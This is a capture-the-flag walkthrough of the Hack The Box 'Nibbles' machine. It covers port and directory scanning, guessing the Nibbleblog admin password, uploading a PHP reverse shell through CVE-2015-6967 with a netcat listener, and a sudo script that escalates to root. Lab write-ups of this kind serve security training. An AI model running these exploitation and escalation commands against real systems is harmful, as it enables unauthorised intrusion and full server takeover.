# Nibbles

**Machine ip:** 10.10.10.68

## Enumeration
+ `./nmapAutomator.sh -H 10.10.10.75 -t All`
```
└─$ ./nmapAutomator.sh -H 10.10.10.75 -t All

Running all scans on 10.10.10.75

Host is likely running Linux


---------------------Starting Port Scan-----------------------



PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http



---------------------Starting Script Scan-----------------------



PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




---------------------Starting Full Scan------------------------



PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http



No new ports




----------------------Starting UDP Scan------------------------

UDP needs to be run as root, running with sudo...
[sudo] password for kali: 





No UDP ports are open




---------------------Recon Recommendations---------------------


Web Servers Recon:

ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '' -u "10.10.10.75:80/FUZZ" | tee "recon/ffuf_10.10.10.75_80.txt"





Which commands would you like to run?
All (Default), ffuf, Skip <!>

Running Default in (1)s: 


---------------------Running Recon Commands--------------------


Starting ffuf scan


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : 10.10.10.75:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 4614 ::

Finished ffuf scan

=========================



---------------------Finished all scans------------------------


Completed in 5 minute(s) and 27 second(s)

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/17bb4f0d-2c24-434a-a22a-e6e2ccae486e)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b2240455-98da-4620-9610-e51e88a7c721)

+ Navigate to `http://10.10.10.75/`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4a6e4c26-b14f-4560-b51a-c856039e7d9e)

+ Directory fuzzing `http://10.10.10.75/` and there is no found.
```
feroxbuster -u http://10.10.10.75 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w /usr/share/wordlists/dirb/common.txt --depth 2 -s 200 301 302 -r --extract-links
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b32bc692-6942-47ab-b62f-1a2bb8798b4f)

+ View page source and see `/nibbleblog`. 
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/013e1861-d697-4345-9459-3b118743b547)

+ Navigate to `http://10.10.10.75/nibbleblog`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/22e15b9a-8762-4518-b97c-4aa3162c1736)

+ Directory fuzzing `http://10.10.10.75/nibbleblog`
```
feroxbuster -u http://10.10.10.75/nibbleblog -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w /usr/share/wordlists/dirb/common.txt --depth 2 -s 200 301 302 -N 287,288,305,326 -r --extract-links
```
```
└─$ feroxbuster -u http://10.10.10.75/nibbleblog -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w /usr/share/wordlists/dirb/common.txt --depth 2 -s 200 301 302 -N 287,288,305,326 -r --extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.75/nibbleblog
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💢  Line Count Filter     │ 287
 💢  Line Count Filter     │ 288
 💢  Line Count Filter     │ 305
 💢  Line Count Filter     │ 326
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, json, js, sh, cgi, pl, docx, pdf, txt]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       61l      168w     2986c http://10.10.10.75/nibbleblog/
200      GET       22l      126w     2127c http://10.10.10.75/nibbleblog/admin/
200      GET       27l       96w     1401c http://10.10.10.75/nibbleblog/admin.php
200      GET       18l       82w     1353c http://10.10.10.75/nibbleblog/content/
200      GET        8l       15w      300c http://10.10.10.75/nibbleblog/feed.php
200      GET       61l      168w     2986c http://10.10.10.75/nibbleblog/index.php
200      GET       88l      174w     1622c http://10.10.10.75/nibbleblog/update.php
200      GET        1l       11w       78c http://10.10.10.75/nibbleblog/install.php
200      GET       27l      181w     3167c http://10.10.10.75/nibbleblog/languages/
200      GET      675l     5644w    35148c http://10.10.10.75/nibbleblog/LICENSE.txt
200      GET       30l      214w     3777c http://10.10.10.75/nibbleblog/plugins/
200      GET       63l      643w     4628c http://10.10.10.75/nibbleblog/README
200      GET       11l       13w      401c http://10.10.10.75/nibbleblog/sitemap.php
200      GET       20l      104w     1741c http://10.10.10.75/nibbleblog/themes/
200      GET      146l     1032w    82541c http://10.10.10.75/nibbleblog/admin/templates/easy4/css/img/grey.png
[####################] - 2m     52536/52536   0s      found:15      errors:0      
[####################] - 2m     50754/50754   556/s   http://10.10.10.75/nibbleblog/ 
[####################] - 0s     50754/50754   204653/s http://10.10.10.75/nibbleblog/admin/ => Directory listing
[####################] - 0s     50754/50754   187284/s http://10.10.10.75/nibbleblog/content/ => Directory listing
[####################] - 1s     50754/50754   35894/s http://10.10.10.75/nibbleblog/languages/ => Directory listing
[####################] - 3s     50754/50754   19966/s http://10.10.10.75/nibbleblog/plugins/ => Directory listing
[####################] - 0s     50754/50754   153800/s http://10.10.10.75/nibbleblog/themes/ => Directory listing 
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fb2eb882-0f65-4ab2-9d9a-24373c6d2303)

+ Check `http://10.10.10.75/nibbleblog/README`, and also `http://10.10.10.75/nibbleblog/update.php`
+ Nibbleblog's version is 4.0.3.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/578a25c8-a820-4467-97f4-3950ee7fdb8d)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8fb46a8c-c479-40e5-b29e-a0472dfae564)

<br>

+ Navigate to `http://10.10.10.75/nibbleblog/admin.php`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d59f8eef-f1b5-44a1-aa5c-d8a9f030b0f3)

+ Navigate to `http://10.10.10.75/nibbleblog/content/private/users.xml`
+ Navigate to `http://10.10.10.75/nibbleblog/content/private/config.xml`
+ `admin` user found. 
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7a644a06-2448-41d7-99e9-590043555368)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a23156d6-1ba7-4663-b09c-8fc24208004c)

+ Login `http://10.10.10.75/nibbleblog/admin.php`, and try default passwords.
+ Default tries like admin:admin or admin:pass don't work. Instead, `admin`:`nibbles` works.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4033177a-6eca-4f2c-917e-9ff4003418a3)

## Exploitation:
+ `searchsploit nibble 4.0.3`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5d5e4952-3dc6-44ea-aa6e-d2e2a30269ac)

+ Use [CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967)

+ `cp /usr/share/webshells/php/php-reverse-shell.php shell.php`
+ Change ip address and port number to your attack machine.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/25f418ba-986a-44b0-9708-61663df3c527)

+ Start netcat listener: `nc -lnvp 5555`
+ Run exploit:
```
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
```

+ More stable shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74939561-8d9a-4e2a-9f24-8b5661abd10a)

## Privilege Escalation:
+ `sudo -ll`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0dcbc002-98b1-46f4-8363-778c5a22622b)

```
#!/bin/sh
bash
```

+ Get root.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/905a5a63-bb34-4ce0-805e-bd44d6d8ccfc)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b882521-2b36-4314-9a10-ca2394f638ac)



# References & Alternatives:
+ https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html

